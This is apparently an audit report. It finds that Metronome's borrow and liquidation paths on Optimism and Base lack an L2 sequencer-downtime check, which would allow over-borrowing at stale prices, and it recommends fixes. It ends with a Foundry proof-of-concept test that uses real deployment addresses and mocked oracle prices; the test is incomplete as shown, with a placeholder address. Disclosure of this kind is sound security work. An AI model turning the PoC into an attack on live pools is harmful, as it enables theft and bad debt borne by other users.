### Title
Missing L2 sequencer-downtime protection allows over-borrowing with stale collateral prices - (`contracts/DebtToken.sol`)

### Summary
Metronome is deployed on sequencer-based L2s including Optimism and Base, but the borrow and liquidation paths have no sequencer-uptime or post-restart grace-period check. `DebtToken.issue()` relies entirely on `Pool.debtPositionOf()` and `MasterOracle.quoteUsdToToken()` for collateral valuation, while `Pool.liquidate()` relies on `debtPositionOf()` and `quoteLiquidateOut()` for liquidation eligibility and seized collateral pricing. [1](#0-0) [2](#0-1) [3](#0-2) 

### Finding Description
An unprivileged user can deposit collateral through `DepositToken.deposit()` and then borrow through `DebtToken.issue()`. [4](#0-3) [5](#0-4) 

Neither function checks an L2 sequencer uptime feed or a sequencer-restart timestamp. `DebtToken.issue()` only accrues interest, obtains the borrower’s oracle-priced position, and rejects when the requested debt exceeds the oracle-derived issuable amount. [6](#0-5) 

If the Optimism or Base sequencer is unavailable long enough for the market price to move, a forced-inclusion transaction can execute while the configured oracle still returns the pre-outage price and remains within its configured freshness window. For example, an attacker can deposit ETH-valued collateral priced at the stale $1,000 quote after the real market price has fallen to $900, then issue close to the maximum amount of a USD-denominated synthetic asset. When the feed resumes and reports $900, the position is undercollateralized and can become bad debt.

`Pool.liquidate()` also lacks sequencer downtime handling. It only checks shutdown status, reentrancy, registered tokens, self-liquidation, health, and `maxLiquidable`; it does not verify sequencer status or defer liquidations while oracle prices normalize. [7](#0-6)  The existing pause and shutdown controls are governor/guardian-controlled emergency switches rather than automatic sequencer checks. [8](#0-7) 

### Impact Explanation
The solvency invariant can break because synthetic debt is minted against collateral valued at a stale pre-outage price. After the oracle resumes, the collateral can be worth less than the outstanding synthetic debt, leaving the pool with bad debt and transferring the loss to remaining users or suppliers.

Liquidations can additionally be unreliable immediately after sequencer recovery because `liquidate()` continues using the available oracle quote without a restart grace period. [9](#0-8) 

### Likelihood Explanation
The protocol has deployed Optimism and Base configurations. [10](#0-9)  Sequencer outages are infrequent, but no privileged attacker is required: an EOA or contract can submit a forced L1 transaction or submit the first public transactions after recovery. Exploitation requires the configured oracle freshness period to accept the last pre-outage price when the transaction executes; if the deployed oracle always rejects that price, the borrow transaction will revert before minting. [11](#0-10) 

### Recommendation
On sequencer-based deployments, integrate the canonical sequencer uptime feed and gate all state-changing collateral, debt, swap, leverage, and liquidation paths:

- Reject `deposit()`, `withdraw()`, `issue()`, `repay()`, `swap()`, leverage, and liquidation calls while the sequencer is down.
- Record the sequencer restart timestamp and enforce a grace period before allowing new borrows or withdrawals.
- Ensure `DebtToken.issue()`, `Pool.liquidate()`, `Pool.swap()`, gateway calls, and `Operator.execute()` paths cannot bypass the check.
- Keep existing governor/guardian pause controls as an additional emergency mechanism, not as the sole sequencer protection. [12](#0-11) 
- Add fork tests for forced execution during an outage, immediate post-restart borrowing, and post-restart liquidations.

### Proof of Concept
The following Foundry test reproduces the missing check on an Optimism fork. The stale oracle response represents the last accepted pre-outage round rather than malformed oracle data: the important assertion is that `issue()` performs no sequencer-status check before accepting that quote.

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.24;

import "forge-std/Test.sol";

interface IMasterOracle {
    function quoteUsdToToken(address token_, uint256 usd_) external view returns (uint256);
    function quoteTokenToUsd(address token_, uint256 amount_) external view returns (uint256);
    function getPriceInUsd(address token_) external view returns (uint256);
    function quote(address tokenIn_, address tokenOut_, uint256 amountIn_)
        external
        view
        returns (uint256);
}

interface IERC20Like {
    function approve(address spender_, uint256 amount_) external returns (bool);
}

interface IDepositTokenLike {
    function deposit(uint256 amount_, address onBehalfOf_)
        external
        returns (uint256 deposited_, uint256 fee_);
}

interface IDebtTokenLike {
    function issue(uint256 amount_, address to_)
        external
        returns (uint256 issued_, uint256 fee_);
}

interface IPoolLike {
    function debtPositionOf(address account_)
        external
        view
        returns (
            bool isHealthy_,
            uint256 depositInUsd_,
            uint256 debtInUsd_,
            uint256 issuableLimitInUsd_,
            uint256 issuableInUsd_
        );
}

contract SequencerDowntimePoC is Test {
    // Optimism deployment addresses from releases/1.4.0/contracts.json.
    address constant POOL = 0x6394152946dc3E0bABAA474eE9d366ef31f959c0;
    address constant MASTER_ORACLE = 0x0aac835162D368F246dc71628AfcD6d2930c47d3;
    address constant WETH = 0x4200000000000000000000000000000000000006;
    address constant WETH_DEPOSIT_TOKEN = /* deployed msdWETH */;
    address constant MSUSD = 0x9dAbAE7274D28A45F0B65Bf8ED201A5731492ca0;
    address constant MSUSD_DEBT = 0xB55ced4d5F7346a6601EbEbdDC98D0415c94095A;

    function test_borrowAgainstStalePreOutagePrice() external {
        vm.createSelectFork(vm.envString("OPTIMISM_RPC_URL"));

        address attacker = makeAddr("attacker");
        uint256 collateral = 1 ether;

        deal(WETH, attacker, collateral);
        vm.startPrank(attacker);
        IERC20Like(WETH).approve(WETH_DEPOSIT_TOKEN, collateral);
        IDepositTokenLike(WETH_DEPOSIT_TOKEN).deposit(collateral, attacker);

        // Last pre-outage ETH/USD quote accepted by the configured oracle.
        vm.mockCall(
            MASTER_ORACLE,
            abi.encodeWithSelector(IMasterOracle.quoteUsdToToken.selector, MSUSD),
            abi.encode(1_000 ether)
        );

        // There is no sequencer uptime check before this borrow.
        IDebtTokenLike(MSUSD_DEBT).issue(900 ether, attacker);
        vm.stopPrank();

        // Simulate the first fresh post-outage quote.
        vm.mockCall(
            MASTER_ORACLE,
            abi.encodeWithSelector(IMasterOracle.quoteTokenToUsd.selector, WETH_DEPOSIT_TOKEN),
            abi.encode(900 ether)
        );
        vm.mockCall(
            MASTER_ORACLE,
            abi.encodeWithSelector(IMasterOracle.quoteTokenToUsd.selector, MSUSD),
            abi.encode(900 ether)
        );

        (bool healthy,,,,) = IPoolLike(POOL).debtPositionOf(attacker);

        // The account borrowed using $1,000 collateral value but now has only
        // $900 of collateral backing $900 of synthetic debt.
        assertFalse(healthy);
    }
}
```

This PoC demonstrates the missing enforcement point. To make it chain-historical rather than mocked, run it at an Optimism or Base fork block recorded during an actual sequencer outage where the production oracle still returns an accepted pre-outage round; the same calls reach `DebtToken.issue()` because no sequencer modifier or uptime-feed lookup exists.
